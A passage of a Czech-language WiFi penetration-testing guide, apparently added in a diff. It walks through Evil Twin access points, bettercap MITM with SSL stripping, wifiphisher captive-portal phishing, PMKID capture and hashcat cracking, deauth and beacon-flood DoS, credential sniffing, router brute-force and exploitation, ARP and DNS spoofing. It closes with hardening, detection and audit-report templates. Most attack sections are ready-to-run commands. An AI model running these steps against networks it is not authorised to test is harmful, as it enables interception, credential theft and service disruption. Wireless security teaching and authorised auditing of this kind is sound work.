+Útok Evil Twin:
+  1. Útočník zjistí SSID a BSSID cílové sítě
+  2. Vytvoří AP se stejným SSID (falešný AP)
+  3. Pošle deauth pakety klientům cílové sítě
+  4. Klienti se odpojí a automaticky hledají nejsilnější signál
+  5. Klienti se připojí k falešnému AP (= útočníkovi)
+  6. Útočník je Man-in-the-Middle nebo sbírá credentials
+
+Varianty:
+  - Captive portal → krádež WiFi hesla přes webovou stránku
+  - WPA downgrade → útočníkův AP bez hesla (otevřená síť)
+  - MITM → zachytávání a modifikace HTTP provozu
+```
+
+### 10.2 `hostapd` + `dnsmasq` — manuální Evil Twin
+
+```bash
+# ═══════════════════════════════════════
+# KROK 1: Příprava rozhraní
+# ═══════════════════════════════════════
+# Potřebujeme 2 WiFi adaptéry:
+# wlan0 → připojení k internetu (optional)
+# wlan1 → falešný AP
+
+# ═══════════════════════════════════════
+# KROK 2: Konfigurace hostapd
+# ═══════════════════════════════════════
+cat > /tmp/evil_twin_hostapd.conf << 'EOF'
+interface=wlan1
+driver=nl80211
+ssid=TargetNetwork
+hw_mode=g
+channel=6
+macaddr_acl=0
+ignore_broadcast_ssid=0
+EOF
+
+# ═══════════════════════════════════════
+# KROK 3: Konfigurace DHCP (dnsmasq)
+# ═══════════════════════════════════════
+cat > /tmp/evil_twin_dnsmasq.conf << 'EOF'
+interface=wlan1
+dhcp-range=192.168.100.10,192.168.100.100,255.255.255.0,12h
+dhcp-option=3,192.168.100.1
+dhcp-option=6,192.168.100.1
+server=8.8.8.8
+log-queries
+log-dhcp
+listen-address=127.0.0.1
+EOF
+
+# ═══════════════════════════════════════
+# KROK 4: Nastavení IP adresy na AP
+# ═══════════════════════════════════════
+sudo ip addr add 192.168.100.1/24 dev wlan1
+sudo ip link set wlan1 up
+
+# ═══════════════════════════════════════
+# KROK 5: Povolení IP forwardingu (internet přes útočníka)
+# ═══════════════════════════════════════
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+sudo iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
+
+# ═══════════════════════════════════════
+# KROK 6: Spuštění AP a DHCP
+# ═══════════════════════════════════════
+sudo hostapd /tmp/evil_twin_hostapd.conf &
+sudo dnsmasq -C /tmp/evil_twin_dnsmasq.conf -d &
+
+# ═══════════════════════════════════════
+# KROK 7: Deauth klientů z originálního AP
+# ═══════════════════════════════════════
+sudo aireplay-ng -0 0 -a ORIGINAL_BSSID wlan0mon
+```
+
+### 10.3 `bettercap` — automatizovaný MITM
+
+**Co je:** Výkonný síťový útočný framework pro MITM, sniffing a manipulaci provozu.  
+**Jak funguje:** Modulární architektura — wifi modul spravuje AP, net.recon skenuje sít, http.proxy zachytává HTTP, ssl.strip downgraduje HTTPS.
+
+```bash
+# Spuštění
+sudo bettercap -iface wlan0
+
+# V bettercap konzoli:
+
+# Skenování WiFi sítí
+> wifi.recon on
+> wifi.show
+
+# Deauth útok na konkrétní AP
+> wifi.deauth AA:BB:CC:DD:EE:FF
+
+# Vytvoření Evil Twin / Captive Portal
+> set wifi.ap.ssid "Free_WiFi"
+> set wifi.ap.bssid AA:BB:CC:DD:EE:FF
+> set wifi.ap.channel 6
+> set wifi.ap.encryption false
+> wifi.ap on
+
+# ARP poisoning (MITM)
+> set arp.spoof.targets 192.168.1.0/24
+> arp.spoof on
+
+# HTTP proxy (zachytávání provozu)
+> http.proxy on
+> net.sniff on
+
+# SSL stripping
+> set https.proxy.sslstrip true
+> https.proxy on
+
+# Zachycení přihlašovacích údajů
+> caplets.show
+> hstshijack/hstshijack   # bypass HSTS
+```
+
+### 10.4 `airbase-ng` — vytvoření falešného AP
+
+```bash
+# Vytvoření otevřeného falešného AP
+sudo airbase-ng -e "Free_WiFi" -c 6 wlan0mon
+
+# Falešný AP se WPA šifrováním (pro zachycení handshake)
+sudo airbase-ng -e "TargetNetwork" -c 6 \
+  -z 4 wlan0mon
+# -z 4 = WPA2/CCMP
+
+# AP s konkrétní MAC adresou
+sudo airbase-ng -e "TargetNetwork" \
+  -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon
+
+# Zachycování WPA handshake od klientů spojujících se s falešným AP
+# Funguje protože klienti pošlou heslo při pokusu o připojení
+```
+
+### 10.5 `wifiphisher` — automatizovaný Evil Twin s captive portálem
+
+**Co je:** Automatizovaný rogue AP framework s připravenými phishingovými scénáři.  
+**Jak funguje:** Automaticky skenuje sítě, deautentizuje klienty a spustí falešný AP s captive portálem napodobujícím routerové rozhraní.
+
+```bash
+# Instalace
+sudo apt install -y wifiphisher
+
+# Základní spuštění (interaktivní výběr cíle)
+sudo wifiphisher
+
+# Konkrétní cíl a phishing scénář
+sudo wifiphisher -aI wlan0 -jI wlan1 \
+  -e "TargetNetwork" \
+  --phishing-pages firmware-upgrade
+
+# Dostupné phishing scénáře:
+# firmware-upgrade      → Falešný upgrade firmwaru routeru
+# oauth-login           → Falešné OAuth přihlášení
+# plugin-update         → Falešná aktualizace pluginu
+# network-manager-login → Falešný Linux Network Manager dialog
+# wifi-connect          → Jednoduchá přihlašovací stránka
+
+# Automatický deauth + captive portal pro WiFi heslo
+sudo wifiphisher -aI wlan0mon \
+  -e "TargetNetwork" \
+  --phishing-pages wifi-connect \
+  --force-hostapd
+```
+
+---
+
+## 11. PMKID útok
+
+### 11.1 Jak PMKID útok funguje
+
+PMKID útok (Jens Steube, 2018) nevyžaduje zachycení 4-way handshake. PMKID je součástí prvního EAPOL rámce a lze ho získat přímo od AP bez přítomnosti klienta.
+
+```
+PMKID výpočet:
+  PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID || STMAC)
+  PMK   = PBKDF2(HMAC-SHA1, heslo, SSID, 4096, 32)
+
+Výhoda oproti handshake útoku:
+  - Nevyžaduje čekat na klienta
+  - Nezpůsobuje rušení (no deauth)
+  - Stačí jeden EAPOL paket přímo od AP
+```
+
+### 11.2 `hcxdumptool` — zachycení PMKID
+
+**Co je:** Nástroj pro zachytávání PMKID, handshake a dalších dat z bezdrátových sítí.  
+**Jak funguje:** Aktivně posílá speci EAPOL requesty na AP a zachytává PMKID z odpovědí.
+
+```bash
+# ═══════════════════════════════════════
+# ZÁKLADNÍ PMKID ZACHYCENÍ
+# ═══════════════════════════════════════
+
+# Zachycení PMKID ze všech AP v dosahu
+sudo hcxdumptool -o pmkid_capture.pcapng -i wlan0mon \
+  --enable_status=1
+
+# Zachycení z konkrétního AP
+echo "AA:BB:CC:DD:EE:FF" | sed 's/://g' > /tmp/filter.txt
+sudo hcxdumptool -o pmkid_capture.pcapng -i wlan0mon \
+  --filterlist_ap=/tmp/filter.txt \
+  --filtermode=2 \
+  --enable_status=1
+
+# Zachycení s timeoutem (30 sekund)
+sudo timeout 60 hcxdumptool -o pmkid_capture.pcapng \
+  -i wlan0mon --enable_status=1
+
+# ═══════════════════════════════════════
+# KONVERZE PRO HASHCAT
+# ═══════════════════════════════════════
+
+# Konverze pcapng → hc22000 formát (PMKID + handshake)
+hcxpcapngtool -o hash.hc22000 pmkid_capture.pcapng
+
+# Zobrazení obsahu
+hcxhashtool -i hash.hc22000 --info=stdout
+
+# Separace PMKID a handshake
+hcxhashtool -i hash.hc22000 --pmkid=pmkid_only.txt
+hcxhashtool -i hash.hc22000 --eapol=eapol_only.txt
+
+# ═══════════════════════════════════════
+# CRACKING PMKID
+# ═══════════════════════════════════════
+
+# Hashcat útok na PMKID (mode 22000)
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+
+# Rychlý test s malým wordlistem
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/dirb/common.txt
+
+# Výsledky
+hashcat -m 22000 hash.hc22000 --show
+```
+
+---
+
+## 12. Deautentizační útoky & DoS
+
+### 12.1 Jak deauth útok funguje
+
+```
+802.11 Management Frame problém:
+  - Management frames (deauth, disassoc) nejsou autentizovány
+  - Útočník může spoofovat MAC adresu AP nebo klienta
+  - Klienti nemohou ověřit zda je deauth legitimní
+  - Řešení: 802.11w (Management Frame Protection) - volitelný standard
+
+Typy:
+  Deauthentication (Reason code 1-15) → odpojení klienta
+  Disassociation (Reason code 1-10) → de-asociace klienta
+```
+
+### 12.2 `aireplay-ng` — deauth útoky
+
+```bash
+# ═══════════════════════════════════════
+# DEAUTH ÚTOKY
+# ═══════════════════════════════════════
+
+# Deauth konkrétního klienta od AP
+sudo aireplay-ng -0 10 \
+  -a AA:BB:CC:DD:EE:FF \
+  -c 11:22:33:44:55:66 \
+  wlan0mon
+
+# Broadcast deauth (všichni klienti)
+sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Nepřetržitý deauth (-0 0 = nekonečně)
+sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF \
+  -c 11:22:33:44:55:66 wlan0mon
+
+# ═══════════════════════════════════════
+# DISASSOCIATION ÚTOK
+# ═══════════════════════════════════════
+sudo aireplay-ng -0 10 --deauth-rc 8 \
+  -a AA:BB:CC:DD:EE:FF wlan0mon
+```
+
+### 12.3 `mdk4` — pokročilé WiFi DoS
+
+**Co je:** Pokročilý nástroj pro testování robustnosti bezdrátových sítí a DoS testování.  
+**Jak funguje:** Implementuje různé typy WiFi DoS útoků — beacon flooding, deauth storm, SSID probing, atd.
+
+```bash
+# ═══════════════════════════════════════
+# BEACON FLOOD — Zahlcení AP falešnými sítěmi
+# ═══════════════════════════════════════
+
+# Náhodné SSID beacon flood
+sudo mdk4 wlan0mon b
+
+# Beacon flood s vlastním SSID listem
+sudo mdk4 wlan0mon b -f /tmp/ssid_list.txt
+
+# Beacon flood cílený na konkrétní AP (AP vidí ghost sítě)
+sudo mdk4 wlan0mon b -c 6
+
+# ═══════════════════════════════════════
+# DEAUTH / DISASSOC STORM
+# ═══════════════════════════════════════
+
+# Deauth útok na všechny klienty konkrétního AP
+sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF
+
+# Deauth s blacklistem
+sudo mdk4 wlan0mon d -b /tmp/blacklist.txt -c 6
+
+# Deauth vše (agresivní)
+sudo mdk4 wlan0mon d
+
+# ═══════════════════════════════════════
+# AUTHENTICATION FLOOD
+# ═══════════════════════════════════════
+# Zahlcení AP autentizačními requesty
+sudo mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF
+
+# ═══════════════════════════════════════
+# MICHAEL SHUTDOWN EXPLOITATION (WPA/TKIP)
+# ═══════════════════════════════════════
+# Vyvolá bezpečnostní reakci (TKIP shutdown na 60s)
+sudo mdk4 wlan0mon m -t AA:BB:CC:DD:EE:FF
+```
+
+---
+
+## 13. Sniffing a analýza provozu
+
+### 13.1 `wireshark` — GUI analýza paketů
+
+**Co je:** Nejpopulárnější síťový analyzátor protokolů s grafickým rozhraním.  
+**Jak funguje:** Zachytává pakety z síťového rozhraní a umožňuje jejich detailní analýzu, filtrování a dekryptování.
+
+```bash
+# Spuštění
+sudo wireshark
+
+# Nebo přímo na rozhraní
+sudo wireshark -i wlan0mon
+
+# ═══════════════════════════════════════
+# DŮLEŽITÉ WIRESHARK FILTRY PRO WIFI
+# ═══════════════════════════════════════
+
+# Filtr na EAPOL (handshake pakety)
+eapol
+
+# Filtr na beacon frames
+wlan.fc.type_subtype == 0x0008
+
+# Filtr na probe requesty
+wlan.fc.type_subtype == 0x0004
+
+# Filtr na deauth rámce
+wlan.fc.type_subtype == 0x000c
+
+# Filtr na konkrétní BSSID
+wlan.bssid == aa:bb:cc:dd:ee:ff
+
+# Filtr HTTP provozu po připojení
+http
+
+# Credentials v HTTP
+http.request.method == "POST"
+
+# DNS dotazy
+dns
+
+# ═══════════════════════════════════════
+# DEKRYPTOVÁNÍ WPA PROVOZU V WIRESHARK
+# ═══════════════════════════════════════
+# Edit → Preferences → Protocols → IEEE 802.11
+# Enable decryption: Yes
+# Decryption keys → Add → wpa-pwd
+# Format: heslo:SSID (např. password123:HomeNetwork)
+# Nebo wpa-psk s hexadecimálním PMK
+```
+
+### 13.2 `tshark` — CLI analýza
+
+```bash
+# Zachytávání v monitor módu
+sudo tshark -i wlan0mon
+
+# Zachytávání na konkrétním kanálu (s iw)
+sudo iw dev wlan0mon set channel 6
+sudo tshark -i wlan0mon -w capture.pcap
+
+# Filtr EAPOL rámců
+sudo tshark -i wlan0mon -f "ether proto 0x888e"
+
+# Zobrazení SSID z beacon frames
+sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype==8" \
+  -T fields -e wlan.ssid -e wlan.bssid
+
+# Extrakce HTTP credentials z .pcap souboru
+tshark -r capture.pcap -Y "http.request.method==POST" \
+  -T fields -e http.request.uri -e http.file_data
+
+# Statistiky protokolů
+tshark -r capture.pcap -q -z io,phs
+
+# Konverzace
+tshark -r capture.pcap -q -z conv,ip
+```
+
+### 13.3 `tcpdump` — jednoduchý CLI sniffer
+
+```bash
+# Zachytávání WiFi rámců
+sudo tcpdump -i wlan0mon
+
+# Zachytávání do souboru
+sudo tcpdump -i wlan0mon -w wifi_capture.pcap
+
+# Filtr na EAPOL (handshake)
+sudo tcpdump -i wlan0mon ether proto 0x888e
+
+# Filtr na konkrétní MAC
+sudo tcpdump -i wlan0mon ether host AA:BB:CC:DD:EE:FF
+
+# Zachytávání ARP provozu (po připojení)
+sudo tcpdump -i wlan0 arp
+
+# Zobrazení HTTP provozu
+sudo tcpdump -i wlan0 -A -s 0 'port 80'
+```
+
+### 13.4 `dsniff` toolset — zachytávání credentials
+
+```bash
+# dsniff — zachytávání hesel z síťového provozu
+sudo dsniff -i wlan0
+
+# urlsnarf — zachytávání navštívených URL
+sudo urlsnarf -i wlan0
+
+# webspy — monitoring webového provozu
+sudo webspy -i wlan0 192.168.1.100
+
+# sshmitm — MITM pro SSH (vyžaduje ARP poisoning)
+sudo sshmitm -p 2222
+```
+
+---
+
+## 14. Cracking hesel — pokročilé techniky
+
+### 14.1 Pokročilé strategie hashcat
+
+```bash
+# ═══════════════════════════════════════
+# BEST PRACTICES — POŘADÍ ÚTOKŮ
+# ═══════════════════════════════════════
+# 1. Nejdříve rychlé útoky (wordlist + jednoduché pravidla)
+# 2. Pak kombinační útoky
+# 3. Pak brute-force s maskami
+# 4. Nakonec velké wordlisty s komplexními pravidly
+
+# ═══════════════════════════════════════
+# EFEKTIVNÍ KOMBINACE WORDLIST + RULES
+# ═══════════════════════════════════════
+
+# best64.rule — nejúčinnější rychlá pravidla
+hashcat -m 22000 hash.hc22000 rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule
+
+# Kombinace více pravidel
+hashcat -m 22000 hash.hc22000 rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule \
+  -r /usr/share/hashcat/rules/leetspeak.rule
+
+# dive.rule — velmi rozsáhlé pravidlo (pomalé ale thorough)
+hashcat -m 22000 hash.hc22000 rockyou.txt \
+  -r /usr/share/hashcat/rules/dive.rule
+
+# ═══════════════════════════════════════
+# BRUTE-FORCE MASKY — TYPICKÁ WIFI HESLA
+# ═══════════════════════════════════════
+
+# Znakové sady:
+# ?l = abcdefghijklmnopqrstuvwxyz
+# ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
+# ?d = 0123456789
+# ?s = !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
+# ?a = ?l?u?d?s
+# ?h = 0-9a-f
+
+# 8 číslic (typické routery)
+hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
+
+# 8 znaků lowercase + čísla
+hashcat -m 22000 hash.hc22000 -a 3 ?l?l?l?l?l?d?d?d
+
+# Telefonní číslo (CZ formát)
+hashcat -m 22000 hash.hc22000 -a 3 7?d?d?d?d?d?d?d?d
+
+# Rok + slovo (password2023 pattern)
+hashcat -m 22000 hash.hc22000 -a 6 wordlist.txt ?d?d?d?d
+
+# ═══════════════════════════════════════
+# CRUNCH — GENERÁTOR WORDLISTŮ
+# ═══════════════════════════════════════
+
+# Generování všech kombinací 8 číslic
+crunch 8 8 0123456789 -o 8digit_passwords.txt
+
+# Generování hesel délky 8-10 s konkrétními znaky
+crunch 8 10 abcdefghijklmnopqrstuvwxyz0123456789
+
+# Použití pattern
+crunch 11 11 -t @@@@@@12345  # 6 písmen + 12345
+
+# Přímé použití s aircrack-ng (bez uložení)
+crunch 8 8 0123456789 | aircrack-ng -w - hash.cap
+
+# ═══════════════════════════════════════
+# PRINCE — Pravděpodobnostní generátor
+# ═══════════════════════════════════════
+
+# Stažení a kompilace
+git clone https://github.com/hashcat/princeprocessor
+cd princeprocessor/src
+make
+
+# Generování na základě pravděpodobnosti
+./pp64 wordlist.txt | hashcat -m 22000 hash.hc22000 -
+
+# ═══════════════════════════════════════
+# PYRIT — GPU-accelerated cracking
+# ═══════════════════════════════════════
+
+# Vytvoření databáze PMK (předvýpočet)
+pyrit -e "TargetSSID" -i /usr/share/wordlists/rockyou.txt \
+  -o pmk_database.db batch
+
+# Cracking s předpočítanou databází
+pyrit -r capture.cap -i pmk_database.db attack_db
+
+# Import/export PMK
+pyrit -e "TargetSSID" -i /usr/share/wordlists/rockyou.txt batch
+pyrit -r capture.cap attack_batch
+```
+
+### 14.2 Rainbow tables pro WPA
+
+```bash
+# Cowpatty — cracking s předpočítanými tabulkami
+# Generování PMK tabulky
+genpmk -f /usr/share/wordlists/rockyou.txt \
+  -d pmk_table.db -s "TargetSSID"
+
+# Cracking s tabulkou
+cowpatty -r capture.cap -d pmk_table.db -s "TargetSSID"
+
+# Rychlý slovníkový útok (bez tabulek)
+cowpatty -r capture.cap -f /usr/share/wordlists/rockyou.txt \
+  -s "TargetSSID"
+```
+
+### 14.3 Vlastní wordlisty — cílená příprava
+
+```bash
+# ═══════════════════════════════════════
+# CEWL — Scraping wordlistu z webu cíle
+# ═══════════════════════════════════════
+# Generuje wordlist ze slov nalezených na webu organizace
+
+cewl https://www.target-company.cz -m 8 -d 3 -w custom_wordlist.txt
+# -m 8 → minimální délka slova
+# -d 3 → hloubka crawlingu
+
+# ═══════════════════════════════════════
+# KOMBINACE ZDROJŮ
+# ═══════════════════════════════════════
+
+# Sloučení wordlistů
+cat rockyou.txt custom_wordlist.txt | sort -u > combined.txt
+
+# Kombinace cewl wordlistu s rockyou a mutacemi
+hashcat -m 22000 hash.hc22000 combined.txt \
+  -r /usr/share/hashcat/rules/best64.rule \
+  --stdout | hashcat -m 22000 hash.hc22000
+
+# ═══════════════════════════════════════
+# MENTALIST — GUI generátor wordlistů
+# ═══════════════════════════════════════
+# pip3 install mentalist
+# Umožňuje kombinovat slova se vzory, mutacemi, číslicemi
+```
+
+---
+
+## 15. Automatizované nástroje
+
+### 15.1 `wifite2` — automatizovaný WiFi auditor
+
+**Co je:** Automatizovaný Python nástroj, který kombinuje aircrack-ng, reaver, hcxtools a hashcat do jednoho pracovního postupu.  
+**Jak funguje:** Automaticky skenuje sítě, vybírá nejlepší útok dle detekovaného šifrování a pokouší se o prolomení.
+
+```bash
+# Instalace
+sudo apt install -y wifite2
+# nebo
+git clone https://github.com/derv82/wifite2
+cd wifite2 && sudo python3 setup.py install
+
+# ═══════════════════════════════════════
+# ZÁKLADNÍ POUŽITÍ
+# ═══════════════════════════════════════
+
+# Automatické skenování a útok
+sudo wifite
+
+# Útok pouze na WPA sítě
+sudo wifite --wpa
+
+# S vlastním wordlistem
+sudo wifite --dict /usr/share/wordlists/rockyou.txt
+
+# Útok pouze PMKID metodou (bez deauth)
+sudo wifite --pmkid --no-deauth
+
+# Útok pouze handshake
+sudo wifite --wpa --no-pmkid
+
+# ═══════════════════════════════════════
+# CÍLENÉ ÚTOKY
+# ═══════════════════════════════════════
+
+# Cílit konkrétní BSSID
+sudo wifite --bssid AA:BB:CC:DD:EE:FF
+
+# Cílit konkrétní SSID
+sudo wifite --essid "TargetNetwork"
+
+# Cílit jen WPS sítě
+sudo wifite --wps --wps-pixie
+
+# ═══════════════════════════════════════
+# POKROČILÉ NASTAVENÍ
+# ═══════════════════════════════════════
+
+# Nastavení hashcat jako crackeru
+sudo wifite --hashcat
+
+# Nastavení počtu deauth paketů
+sudo wifite --deauths 10
+
+# Timeout pro každou síť (sekundy)
+sudo wifite --wpa-handshake-timeout 120
+
+# Ignorovat sítě se slabým signálem
+sudo wifite --min-power -70
+
+# Jen zobrazit sítě (no attack)
+sudo wifite --scan
+```
+
+### 15.2 `airgeddon` — all-in-one bash framework
+
+**Co je:** Komplexní bash skript s interaktivním menu pro celý WiFi pentest workflow.  
+**Jak funguje:** Wrapper pro desítky nástrojů s průvodcem krok za krokem.
+
+```bash
+# Instalace
+git clone https://github.com/v1s1t0r1sh3r3/airgeddon
+cd airgeddon
+sudo bash airgeddon.sh
+
+# Nabídka zahrnuje:
+# 1. Výběr rozhraní
+# 2. Nastavení monitor/managed módu
+# 3. DoS útoky
+# 4. Zachycení handshake
+# 5. Offline cracking
+# 6. Evil Twin útoky
+# 7. WPS útoky
+# 8. Enterprise útoky
+```
+
+### 15.3 `routersploit` — exploitation routerů
+
+**Co je:** Exploitation framework specializovaný na routery a embedded zařízení.  
+**Jak funguje:** Obsahuje moduly pro exploitaci zranitelností ve firmwaru routerů, brute-force credentials a skenování.
+
+```bash
+# Instalace
+git clone https://github.com/threat9/routersploit
+cd routersploit
+pip3 install -r requirements.txt
+python3 rsf.py
+
+# V routersploit konzoli:
+rsf > use scanners/autopwn
+rsf (AutoPwn) > set target 192.168.1.1
+rsf (AutoPwn) > run
+
+# Brute-force přihlášení routeru
+rsf > use creds/routers/router_http
+rsf (Router HTTP Bruteforcer) > set target 192.168.1.1
+rsf (Router HTTP Bruteforcer) > run
+
+# Konkrétní exploit
+rsf > use exploits/routers/linksys/rce_cve_2014_8244
+rsf > set target 192.168.1.1
+rsf > check
+rsf > run
+```
+
+---
+
+## 16. Post-exploitation po WiFi přístupu
+
+### 16.1 Průzkum po připojení k WiFi
+
+```bash
+# Zjistit IP a síťové nastavení
+ip a
+ip route
+cat /etc/resolv.conf
+
+# Skenování sítě (po připojení jako klient)
+sudo nmap -sn 192.168.1.0/24
+
+# Detailní sken aktivních hostů
+sudo nmap -sV -A 192.168.1.0/24
+
+# Zjistit výchozí bránu (router)
+ip route | grep default
+
+# Skenovat router
+sudo nmap -sV -p 80,443,22,23,8080 192.168.1.1
+```
+
+### 16.2 Přístup k routeru
+
+```bash
+# Zkusit výchozí credentials
+# admin:admin, admin:password, admin:(prázdné)
+# user:user, root:root
+
+# Brute-force přihlášení routeru
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  192.168.1.1 http-get /
+
+# Pokud router má SSH
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  192.168.1.1 ssh
+
+# Přístup k routeru přes telnet
+telnet 192.168.1.1
+
+# Výpis DHCP leases (zjistit všechna zařízení)
+# Na routeru:
+cat /tmp/dhcp.leases
+```
+
+### 16.3 ARP Poisoning — MITM po přístupu
+
+```bash
+# Povolení IP forwardingu
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+# ARP poisoning pomocí arpspoof
+# Poisonovat oběť (říct jí, že jsme router)
+sudo arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1
+
+# Poisonovat router (říct mu, že jsme oběť)
+sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.100
+
+# Nebo pomocí bettercap
+sudo bettercap -iface wlan0
+> set arp.spoof.targets 192.168.1.100
+> arp.spoof on
+> net.sniff on
+
+# Zachytávání credentials v síti
+sudo dsniff -i wlan0
+```
+
+### 16.4 DNS Spoofing
+
+```bash
+# Bettercap DNS spoofing
+sudo bettercap -iface wlan0
+> set dns.spoof.domains target.com,*.target.com
+> set dns.spoof.address 192.168.1.50
+> dns.spoof on
+
+# dnsspoof (po arp poisoningu)
+sudo dnsspoof -i wlan0 -f /tmp/hosts.txt
+
+# /tmp/hosts.txt formát:
+# 192.168.1.50 *.facebook.com
+# 192.168.1.50 *.google.com
+```
+
+---
+
+## 17. Obrana a hardening
+
+### 17.1 Jak se chránit — technická opatření
+
+```
+BEZPEČNOSTNÍ DOPORUČENÍ:
+
+✅ ŠIFROVÁNÍ:
+   - Používat WPA3 (kde je dostupné)
+   - Minimálně WPA2 s AES/CCMP (ne TKIP)
+   - Vypnout WEP, WPA (TKIP)
+
+✅ HESLO:
+   - Minimálně 20 znaků
+   - Kombinace písmen, číslic, symbolů
+   - Náhodné generování (ne slova ze slovníku)
+   - Pravidelná obměna
+
+✅ WPS:
+   - Vypnout WPS úplně
+   - Pokud nelze, vypnout PIN metodu
+
+✅ ROUTER:
+   - Aktualizovat firmware
+   - Změnit výchozí admin credentials
+   - Zakázat vzdálený management
+   - Povolit firewall
+
+✅ SÍŤOVÁ SEGMENTACE:
+   - Oddělit IoT zařízení do Guest sítě
+   - Výrobní stroje do oddělené VLAN
+   - BYOD do Guest WiFi
+
+✅ MONITORING:
+   - Pravidelný audit připojených zařízení
+   - Wireless IDS (Kismet, Snort)
+   - Sledování podezřelého provozu
+```
+
+### 17.2 Detekce útoků
+
+```bash
+# ═══════════════════════════════════════
+# DETEKCE DEAUTH ÚTOKŮ
+# ═══════════════════════════════════════
+
+# Kismet detekuje deauth útoky automaticky
+sudo kismet
+
+# Manuální detekce s tshark
+sudo tshark -i wlan0mon \
+  -Y "wlan.fc.type_subtype==0x000c" \
+  -T fields -e wlan.da -e wlan.sa -e wlan.bssid
+
+# ═══════════════════════════════════════
+# DETEKCE FALEŠNÝCH AP
+# ═══════════════════════════════════════
+
+# Sledovat AP se stejným SSID ale jiným BSSID
+sudo airodump-ng wlan0mon | grep "SSID_Name"
+# Pokud vidíme stejné SSID s jiným BSSID → podezřelé
+
+# Kismet automaticky upozorní na rogue AP
+# Alerts → APSPOOF
+
+# ═══════════════════════════════════════
+# 802.11w — MANAGEMENT FRAME PROTECTION
+# ═══════════════════════════════════════
+# Aktivovat na AP (chrání před deauth útoky)
+# V hostapd.conf:
+# ieee80211w=2  → Required (povinné)
+# ieee80211w=1  → Optional (volitelné)
+```
+
+### 17.3 Testování vlastní sítě
+
+```bash
+# Rychlý audit vlastní sítě
+sudo wifite --wpa --wps --dict /usr/share/wordlists/rockyou.txt
+
+# Test odolnosti vůči deauth
+sudo aireplay-ng -0 5 -a OWN_BSSID wlan0mon
+# Pokud se klienti odpojí → zvažte 802.11w
+
+# Test síly hesla
+echo "vas_wifi_heslo" > /tmp/test_pass.txt
+aircrack-ng -w /tmp/test_pass.txt -b OWN_BSSID capture.cap
+
+# Skenování vlastní sítě na zranitelnosti
+sudo nmap --script vuln 192.168.1.0/24
+```
+
+---
+
+## 18. Reporting WiFi auditu
+
+### 18.1 Struktura WiFi pentest reportu
+
+```markdown
+# WiFi Bezpečnostní Audit — [Jméno klienta]
+
+## Executive Summary
+Stručné hodnocení bezpečnostního stavu WiFi infrastruktury,
+klíčové nálezy a doporučení pro management.
+
+## Rozsah testování (Scope)
+- Testované lokace / budovy
+- Testovaná časová okna
+- Typy testů
+- Použité nástroje
+
+## Metodologie
+Popis použitých technik a přístupu
+
+## Nálezy
+
+### [KRITICKÁ] Síť XY používá WEP šifrování
+### [VYSOKÁ] WPS PIN útok úspěšný na AP ZZ
+### [STŘEDNÍ] Slabé WiFi heslo — prolomeno slovníkovým útokem
+### [NÍZKÁ] Router s výchozími credentials
+
+## Doporučení
+Prioritizovaný seznam opatření
+
+## Přílohy
+- Airodump-ng výstupy
+- Fotodokumentace
+- Screenshoty důkazů
+```
+
+### 18.2 Šablona nálezu pro WiFi
+
+```markdown
+## [KRITICKÁ] WEP šifrování na síti "CorpWiFi_Legacy"
+
+**Závažnost:** Kritická (CVSS 9.8)  
+**Kategorie:** Slabé šifrování  
+**Postižená síť:** CorpWiFi_Legacy (BSSID: AA:BB:CC:DD:EE:FF)  
+**Lokace:** 2. patro, zasedací místnost A
+
+### Popis
+Bezdrátová síť CorpWiFi_Legacy používá WEP (Wired Equivalent Privacy)
+šifrování, které je kryptograficky zcela prolomeno od roku 2007.
+Útočník v dosahu sítě může získat šifrovací klíč a přistoupit
+do sítě v průměru do 5 minut.
+
+### Dopad
+- Neoprávněný přístup do podnikové sítě
+- Odposlech veškeré komunikace
+- Potenciální přístup k interním systémům a datům
+- Porušení GDPR (přístup k osobním údajům)
+
+### Důkaz
+Datum testu: 2024-01-15, 14:32 CET
+
+Příkaz:
+aircrack-ng -n 64 wep_capture-01.cap
+
+Výsledek:
+KEY FOUND! [ XX:XX:XX:XX:XX ]
+
+Čas do prolomení: 4 minuty 23 sekund
+
+Screenshot: [proof_wep_crack.png]
+
+### Doporučení
+1. Okamžitě migrovat na WPA2/AES nebo WPA3
+2. Zkontrolovat zda jsou stará zařízení kompatibilní s WPA2
+3. Pokud ne — izolovat starý hardware do oddělené sítě bez přístupu k interním systémům
+4. Implementovat silné WiFi heslo (min. 20 znaků)
+
+### Reference
+- CVE: N/A (design flaw)
+- NIST SP 800-97: Establishing Wireless Networks
+- IEEE 802.11i Standard (2004)
+```
+
+### 18.3 Hodnocení závažnosti WiFi nálezů
+
+|Nález|Závažnost|CVSS|
+|---|---|---|
+|WEP šifrování|🔴 Kritická|9.8|
+|WPS PIN zranitelný (Pixie Dust)|🔴 Kritická|9.0|
+|Otevřená WiFi síť|🔴 Kritická|9.0|
+|WPA2 s heslem v rockyou|🟠 Vysoká|8.0|
+|WPS povoleno (brute-force)|🟠 Vysoká|7.5|
+|Router s výchozím heslem|🟠 Vysoká|7.0|
+|Evil Twin možný (no 802.11w)|🟡 Střední|6.5|
+|Slabé WPA2 heslo (< 12 znaků)|🟡 Střední|5.5|
+|Skrytý SSID (false security)|🟢 Nízká|2.0|
+|Zastaralý firmware routeru|🟡 Střední|4.0-8.0|
+
+---
+
+## Appendix A: Kompletní přehled nástrojů
+
